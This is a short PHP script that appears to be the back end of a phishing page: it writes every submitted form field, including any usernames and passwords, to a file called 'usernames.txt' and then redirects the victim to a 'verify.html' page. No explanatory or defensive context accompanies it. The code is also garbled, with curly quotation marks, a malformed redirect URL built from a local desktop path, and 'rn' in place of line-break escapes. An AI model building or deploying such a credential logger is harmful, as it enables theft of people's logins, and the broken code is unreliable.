<?php
header (‘Location:http:https:/home/sweaty/Desktop/Desk1/verify.html’);
$handle = fopen(“usernames.txt”, “a”);
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “rn”);
}
fwrite($handle, “rn”);
fclose($handle);
exit;
?> 

